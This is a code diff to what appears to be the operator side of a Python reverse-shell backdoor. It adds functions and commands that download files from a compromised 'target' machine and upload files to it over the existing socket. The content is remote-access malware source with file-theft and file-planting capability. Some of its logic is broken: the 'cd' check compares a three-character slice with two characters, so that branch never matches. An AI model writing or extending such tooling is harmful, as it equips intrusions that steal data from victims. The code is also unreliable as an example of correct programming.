@@ -14,6 +14,23 @@ def reliable_recv():
         except ValueError:
             continue
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
 
 def target_communication():
     while True:
@@ -23,6 +40,10 @@ def target_communication():
             break
         elif command == 'clear':
             os.system('clear')
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         elif command[:3] == 'cd':
             pass
         else:
